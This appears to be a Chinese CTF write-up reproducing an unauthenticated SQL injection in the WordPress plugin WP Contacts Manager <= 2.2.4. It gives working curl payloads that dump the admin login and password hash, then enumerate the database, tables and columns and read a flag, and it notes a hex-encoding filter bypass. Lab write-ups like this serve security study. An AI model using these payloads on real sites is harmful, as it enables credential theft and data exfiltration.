## 1. 漏洞介绍
[WP Contacts Manager <= 2.2.4 - Unauthenticated SQLi](https://wpscan.com/vulnerability/eb9e202d-04aa-4343-86a2-4aa2edaa7f6b/)

wordpress插件 WP Contacts Manager <= 2.2.4 对用户输入的转义不够充分，导致了SQL注入。
## 2. 漏洞复现
### 2.1. POC

```shell
curl 'http://127.0.0.1:8080/wp-admin/admin-ajax.php?action=WP_Contacts_Manager_call&type=get-contact' --data '{"id":"1\u0027 UNION ALL SELECT 1,(SELECT user_login FROM wp_users WHERE ID = 1),(SELECT user_pass FROM wp_users WHERE ID = 1),4,5,6,7,8,9,0,1,2; -- "}'
```

### 2.2. 查数据库

```shell
curl 'http://ec……chunqiu.com/wp-admin/admin-ajax.php?action=WP_Contacts_Manager_call&type=get-contact' --data '{"id":"1\u0027 UNION ALL SELECT 1,(SELECT database()),3,4,5,6,7,8,9,0,1,2; -- "}'
```

![0.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310080954353.png)

### 2.3. 查数据表
注，将库名 ctf 16进制编码后或直接用database()代入查询

```shell
curl 'http://eci……1.ichunqiu.com/wp-admin/admin-ajax.php?action=WP_Contacts_Manager_call&type=get-contact' --data '{"id":"1\u0027 UNION ALL SELECT 1,(SELECT group_concat(table_name) from information_schema.tables where table_schema=database()),3,4,5,6,7,8,9,0,1,2; -- "}'
```

![1.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310080951682.png)

### 2.4. 查字段
注，flag 的16进制编码：0x666c6167【后端应该有过滤，直接用表名 flag 返回null】

```shell
curl 'http://ec……ci1.ichunqiu.com/wp-admin/admin-ajax.php?action=WP_Contacts_Manager_call&type=get-contact' --data '{"id":"1\u0027 UNION ALL SELECT 1,(SELECT group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x666c6167),3,4,5,6,7,8,9,0,1,2; -- "}' 
```

![2.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310080951104.png)

### 2.5. 读取 flag

```shell
curl 'http://e……1.ichunqiu.com/wp-admin/admin-ajax.php?action=WP_Contacts_Manager_call&type=get-contact' --data '{"id":"1\u0027 UNION ALL SELECT 1,(SELECT flag from flag),3,4,5,6,7,8,9,0,1,2; -- "}' 
```

![3.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310080951197.png)
